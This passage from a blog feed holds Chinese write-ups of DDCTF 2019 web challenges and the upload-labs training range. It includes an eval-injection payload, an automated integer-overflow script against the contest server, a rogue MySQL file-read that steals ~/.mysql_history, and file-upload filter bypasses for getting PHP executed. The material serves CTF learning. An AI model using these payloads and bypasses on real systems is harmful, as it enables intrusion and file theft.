strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 生成后继续上传，发现还是提示未包含phpinfo()，没关系。。看之前那篇关于二次渲染的文章时提到过，那些脚本不能保证百分百生效，必要时多找几个图片试试。。。这里我直接把这个上传的图片另存为下来，发现它的大小发生了改变，上传之前是30kb，上传后就变成了20kb，这跟之前几次上传情况不同，之前几次上传的图片我另存为下来大小并没有发生改变。。发现了这个情况后，当时脑子里闪过一个奇怪的想法(可能是第六感吧)，于是把另存为下来的图片再用那个脚本跑一遍，再上传新产生的jpg，这次居然就莫名其妙的成功了2333~ 0x04 homebrew event loop题目进去后，是一个很low的html页面，发现可以看源码。把源码down下来，可以看到这是一个用flask写的简单web123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149# -*- encoding: utf-8 -*- # written in python 2.7 __author__ = 'garzon' from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = '*********************' # censored url_prefix = '/d5af31f99147e857' def FLAG(): return 'FLAG_is_here_but_i_wont_show_you' # censored def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: c = action + ('_handler' if is_action else '_function') print c event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' resp += '&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp @app.route(url_prefix+'/') def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = '' html += '[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'.format(session['num_items'], session['points']) if page == 'index': html += '&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;' elif page == 'shop': html += '&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' elif page == 'reset': del session['num_items'] html += 'Session reset.&lt;br /&gt;' html += '&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == 'True': source = open('eventLoop.py', 'r') html = '' if bool_download_source != 'True': html += '&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' for line in source: if bool_download_source != 'True': html += line.replace('&amp;','&amp;amp;').replace('\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\n', '&lt;br /&gt;') else: html += line source.close() if bool_download_source == 'True': headers = &#123;&#125; headers['Content-Type'] = 'text/plain' headers['Content-Disposition'] = 'attachment; filename=serve.py' return Response(html, headers=headers) else: return html else: trigger_event('action:view;index') def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;&#123;&#125;'.format(num_items), 'action:view;index']) def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] &lt; point_to_consume: raise RollBackException() session['points'] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) &lt;br /&gt;' def get_flag_handler(args): if session['num_items'] &gt;= 5: trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries trigger_event('action:view;index') if __name__ == '__main__': app.run(debug=False, host='0.0.0.0') 简单讲一下，这里代码问题主要在47行，eval函数存在注入,可以通过#注释，我们可以传入路由action:想要执行的函数#;arg1#arg2#arg3这样注释后面语句并可以调用任意函数，分号后面的#为传入参数，参数通过#被分割为参数列表,这里不理解的话建议详细看下get_mid_str函数。对’#’注释eval函数做了个小小测试。 于是可以构造action:trigger_event#;arg1#arg2#arg3调用trigger_event函数，并且该函数参数可以为列表，调用trigger_event，可以发现trigger_event的参数依旧为函数，传入的函数名会被传入事件列表之后在事件循环中被执行，所以调用trigger_event并传入其他函数的话就相当于我们可以执行多个函数。 那既然可以执行任意函数，那是不是直接传入FLAG函数执行就行了呢，可以尝试一下，发现返回404。那为什么会返回404呢，可以在源码中分析一下。我们看到execute_event_loop函数中的部分代码,47、48行，传入的函数执行的时候必带参数args，而args的值在43行处可以看到，等于get_mid_str函数的返回值再调用split函数，这样一来，args就必为列表而FLAG函数是一个没有参数的函数，传入参数调用的话会抛出异常(可与下图类比)而抛出异常后，代码逻辑就跳到了上面的第56行，就会把resp赋为None，再跳到63行，就会返回404了。 那直接执行FLAG函数输出flag这条路堵死了，那就只能另辟蹊径了。 找到另外两个跟flag相关的函数，看到get_flag_handler这个函数如下图,如果num_items大于5，就调用trigger_event函数，这里注意trigger_event函数的参数，&#39;func:show_flag;&#39; + FLAG(),意思是将FLAG函数的返回值即flag作为参数，调用show_flag_function函数，而show_flag_function函数里面，return flag那行被注释了(233~),也就是说通过show_flag_function函数这条路也堵死了。。但是也没有完全堵死，上面调用trigger_event函数传入的参数&#39;func:show_flag;&#39; + FLAG()包含了flag，虽然不能通过show_flag函数回显，但是trigger_event函数（下图）执行时会将参数存入session[‘log’]里，解密session就可以找到flag。 但要达到这个目的的话，就要要求num_items大于5。这里利用了buy_handler函数（下图）的逻辑漏洞(130-131行),这里逻辑是先给货再扣钱所以首先执行buy_handler(5）,再执行get_flag_handler()，就可以绕过session[‘num_items’] &gt;= 5的判断，然后flag会被传递到trigger_event函数并且被写入session[‘log’],要注意执行buy_handler函数后事件列表末尾会加入consume_point_function函数，在最后执行此函数时校验会失败，抛出RollBackException()异常，但是不会影响session的返回。 所以最终payload为:?action:trigger_event%23;action:buy;5%23action:get_flag;然后将得到的session解密。。这里解密用到一个脚本，来源：https://www.leavesongs.com/PENETRATION/client-session-security.html123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 0x05 大吉大利,今晚吃鸡~2019/4/26 题目进去是一个登录框让登录。(最近真是遇到好多登录框的题目，感觉姿势有点不够，好多都没得思路)题目描述是: 注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~ 仔细看看，发现还有注册账户的功能，于是点进去注册一个账户，登录后发现如下图尝试购买游戏入场券，但是发现余额只有100，而票价要2000。不用多说，此处肯定是有办法可以绕过去的，不然题目就做不下去了。于是用burp对购买过程进行抓包，果不其然，发现买票过程的http请求如下图,其中票价ticket_price居然是直接通过get请求参数传输的，于是将票价改成1试试。但是可以发现，票价只能往高处改，不能改低而且只能是数字，于是就该考虑考虑整数溢出(整数溢出之前只在c语言中试过，个人认为只有那种不同整数有不同数据类型才会有整数溢出问题，如C语言c++中的int、short，go语言的unit32、int32。而python、php、js这种应该不存在整数溢出问题)，这里看一些别人的wp里面说很容易判断出这个web页面使用go写的(恕我见识少2333，还是要多学点东西呀)。 从上面分析，判断可能是整数溢出，加上票价肯定是用无符号整数，于是构造2^32 + 1进行尝试,发现成功绕过，进入游戏。 购买吃鸡券后，返回页面有你的id、你的ticket，和当前剩余的对手数量。这里点移除对手看看，发现出现一个输入对手id和ticket移除对手的框 到这里思路就差不多清晰了，不断利用整数溢出购买吃鸡大礼包获得id和ticket，然后用一个账号提交其他注册账号的id、ticket进行淘汰，淘汰99个人之后应该就能爆出flag。 这么一系列的复杂流程，当然用python写了。用python写之前，抓包分析一下 注册、登录、购买、支付等这一系列操作。 注册，可以看到注册请求以get请求参数传递用户名和密码，响应返回格式为json，而且注册成功后会有一个set-cookie，后面可以通过这个cookie访问get_flag页面获取剩余对手信息 登录，登录这里用户名和密码也是用get方式传递的。 买票，买票的话，将票价改为2^32绕过后，购买成功，返回的也是json字串，其中包含bill_id 支付，支付成功的话，就会返回your_id和your_ticket，根据这个就能进行淘汰 移除对手,移除对手的请求通过get方式传递id和ticket，即可淘汰一名对手，返回的json中的msg用Unicode转中文解码后内容为：移除一名机器人玩家 获取剩余敌人，这里获取剩余对手，通过cookie判断当前用户，这里截图因为我用的是我跑完脚本后的账号cookie，所以返回消息里有flag 原谅我这里再赘述一波···上面用burp分析流程可能有点抽象，下面我用python各个流程模拟一遍截个图相信会清晰的很多。 然后贴脚本吧，重要地方也都注释过了。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: file content@Date: 2019-04-26 12:55:57@LastEditTime: 2019-04-26 20:40:50'''# DDCTF 2019大吉大利吃鸡脚本import requestsimport jsonimport timei = 777779999997register = "http://117.51.147.155:5050/ctf/api/register?name=MiracleYTTE&#123;&#125;&amp;password=12345678"login = "http://117.51.147.155:5050/ctf/api/login?name=MiracleYTTE&#123;&#125;&amp;password=12345678"buy_ticket = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"pay_ticket = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;"get_flag = "http://117.51.147.155:5050/ctf/api/get_flag"rm_root = "http://117.51.147.155:5050/ctf/api/remove_robot"def rm_robot(your_id,your_ticket): cookie = &#123;"Cookie": "user_name=miracle1234; REVEL_SESSION=dc0a20b6606cf3eb87828bf5991a1fbe"&#125; #这里把user_name和REVEL_SESSION设成你自己手动注册的账号的。 param = &#123;"id":your_id,"ticket":your_ticket&#125; r = requests.get(url=rm_root,params=param,headers=cookie) # print(r.status_code) flag = requests.get(get_flag,headers=cookie) num = json.loads(flag.text)['data'][0] print(json.loads(flag.text)) return nums = requests.Session() #为什么用Session，此处登录后买票、支付等过程都用了cookie做身份识别，所以用sessionwhile True: i = i+1 # i随便取一段数字(或者改注册和登录的url的用户名，注意每执行一次脚本记得更换i，否则会注册失败 r = s.get(url=register.format(i)) #注册 if r.status_code != 200: print(i,'注册失败') continue r = s.get(login.format(i)) #登录 r = s.get(buy_ticket) #买票 bill_id = json.loads(r.text)['data'][0]['bill_id'] r = s.get(pay_ticket.format(bill_id)) your_id = json.loads(r.text)['data'][0]['your_id'] your_ticket = json.loads(r.text)['data'][0]['your_ticket'] num = rm_robot(your_id,your_ticket) if num == 1: break time.sleep(0.1) #防止太频繁被ban 放执行结果图，这里说一下，会有那种输入id和ticket后且淘汰成功但是对手人数不变的情况，猜测是因为id和ticket重了。跑了还是挺久的，前面几十个淘汰还是快的，基本上能连续淘汰，到了后面人比较少的时候就慢下来了，甚至一两分钟淘汰一个。剩余两个人的时候，即淘汰最后一个人就能吃鸡的时候，跑了好久，估计有个二三十分钟才出来。 0x06 mysql弱口令2019/4/29原谅我的效率低下，实在是这题需要点时间总结。。。先放一下我对mysql客户端任意文件读取的blog 这题进去是一个扫描框。对于我这种刚开始CTF的辣鸡来讲，直接看懵了。其实赛后仔细分析复现这题的话，可以发现并没有自己想的那么难。 这题利用的原理我昨天刚刚学完，水在了自己的博客里，刚刚上面也贴了。所以这里原理就不讲了，直接开干吧。 题目提示:请先在想要扫描的服务器上运行agent.py文件中的代码，再填写IP、端口号进行mysql弱口令扫描中有一个agent.py文件。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 12/1/2019 2:58 PM# @Author : fz# @Site : # @File : agent.py# @Software: PyCharmimport jsonfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandlerfrom optparse import OptionParserfrom subprocess import Popen, PIPEclass RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print("\n----- Request Start -----&gt;\n") print("request_path :", request_path) print("self.headers :", self.headers) print("&lt;----- Request End -----\n") self.send_response(200) self.send_header("Set-Cookie", "foo=bar") self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print("\n----- Request Start -----&gt;\n") print("request_path : %s", request_path) request_headers = self.headers content_length = request_headers.getheaders('content-length') length = int(content_length[0]) if content_length else 0 # print("length :", length) print("request_headers : %s" % request_headers) print("content : %s" % self.rfile.read(length)) # print("&lt;----- Request End -----\n") self.send_response(200) self.send_header("Set-Cookie", "foo=bar") self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = &#123;'local_address': Local_Address, 'Process_name': Process_name&#125; result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GETdef main(): port = 8123 print('Listening on localhost:%s' % port) server = HTTPServer(('0.0.0.0', port), RequestHandler) server.serve_forever()if __name__ == "__main__": parser = OptionParser() parser.usage = ( "Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n" "Run:\n\n") (options, args) = parser.parse_args() main() 这个agent.py代码不是很长，从模块名、函数名大概就能猜到它的意思——开启运行主机上的8123端口做一个http服务器，然后返回运行主机上的tcp进程信息。即代码第57行popen函数执行的命令netstat -tpln，关于linux netstat命令参数的详解可见Linux netstat 命令 这里运行一下netstat -tpln截图如下 agent.py代码的意思理解清楚后，接下来直接做题吧。按照提示把agent.py部署到我的阿里云主机上，记得安全组把8123端口打开，然后在自己的vps上运行agent.py以及伪造的mysql服务端。 然后在题目输入框输入你的vps的地址和你伪造的mysql服务端服务的端口后进行扫描。然后题目提示服务器未开启mysql。 这里就应该可以猜到，题目扫描的流程——先向目标ip的8123端口进行访问，获取目标vps上开启的tcp进程，然后进行判断mysql服务是否开启。所以这里首先要做的是绕过这个判断，我们可以修改agent.py中的代码，从vps上的agent.py的输出结果来看，题目服务器应该使用GET型进行请求。 于是我们找到agent.py代码里的GET处理函数，修改如下图,将返回结果直接赋为result = [{&#39;local_address&#39;:&quot;0.0.0.0:3306&quot;,&quot;Process_name&quot;:&quot;1234/mysqld&quot;}] 改为之后，我们再在伪造mysql服务器的脚本里改要读的文件名称，这里由于是赛后复现，没有比赛时那种猜测的过程，所以就直接给含flag目标文件吧，~/.mysql_history(root用户的mysql操作一般记录在该文件中) 然后开始出flag吧 开启agent.py(修改了GET函数返回值) 开启rogue_mysql_server.py(监听端口3306、filelist为~/.mysql_history) 题目输入框输入vps ip及上述rogue_mysql_server.py(在前面贴的关于原理的博客)监听的端口(注意在自己的云主机上安全组中设置允许通过该端口)，进行扫描 可以看到扫描成功，此时在rouge_mysql_server.py生成的mysql.log中应该就能看到~/.mysql_history文件内容，在里面可以找到flag。 总结剩下两道题，欢迎报名DDCTF、再来一杯Java由于某些原因就不写了。总的来说，这几题搞完下来，感觉还是见识到挺多东西的。感谢滴滴，赛后还保留这么久的环境，让我这个菜鸡可以赛后学习。。 以后还是要多做题呀，通过题目来学习。 参考https://www.ctfwp.com/articals/2019ddctf.htmlhttps://xz.aliyun.com/t/4849#toc-2https://www.leavesongs.com/PENETRATION/client-session-security.html]]></content>
      <categories>
        <category>CTF</category>
        <category>DDCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ddctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2Fupload-labs%2Fupload-labs.html</url>
    <content type="text"><![CDATA[upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。 前言感觉自己对文件上传还不是很熟，做起题目来毫无章法，特此通过做这个文件上传20关来总结提升一下。项目地址:https://github.com/c0ny1/upload-labs 这是所有20关的考察点。我也将按照这个脑图分类总结。 upload-labs write up每一关的解法，我将按照:探测验证点 代码分析 绕过方法的组织结构来叙述。其中探测验证点在前还是后端在Pass-01中写一下，其他Pass可参照Pass1进行判断。 Pass-01-前端js检查探测验证点 首先打开burp和浏览器 上传1.php文件进行观察 这里发现，http请求都没通过burp就弹出了不允许上传的提示框，这表明验证点在前端，而不在服务端 代码分析判断了验证点在前端之后，就可以查看具体js判断代码。于是按F12,找到判断代码。 把代码抠出来整理一下1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == "") &#123; alert("请选择要上传的文件!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.png|.gif"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文类型为：" + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，上传之前，通过js判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传。 绕过方法对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传 Pass-02-只检查Content-type代码分析12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，后端php代码只对Content-Type进行了检查。 绕过方法在burp中更改Content-Type进行绕过即可。 Pass-03黑名单绕过代码分析123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，服务器端做了一个黑名单过滤，过滤了 asp、aspx、php、jsp 绕过方法不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码1AddType application/x-httpd-php .php .phtml .phps .php5 .pht 关于AddType命令的作用解释如下 AddType 指令作用：在给定的文件扩展名与特定的内容类型之间建立映射语法：AddType MIME-type extension [extension] …AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。 此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。 构造.htaccess文件，内容如下:AddType application/x-httpd-php .jpg这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过 Pass-04 .htaccess绕过代码分析123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，黑名单里php、php5等这种后缀全部不允许上传，但并没有限制.htaccsess文件。故可以上传.htaccsess文件绕过 绕过方法同上Pass-03，利用.htaccsess文件 Pass-05 大小写绕过代码分析1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，此处的黑名单比Pass-04多了.htaccess，所有不能通过.htaccsess进行绕过了。但此处代码没有将文件名统一转成小写，故可以通过大小写绕过 绕过方法用burp将后缀改为大写PHP即可 Pass-06 空格绕过代码分析1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过 Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php[空格]文件即可 绕过方法修改文件后缀为1.php .这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和.,达到上传.php的目的。 Pass-07 点绕过代码分析1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。 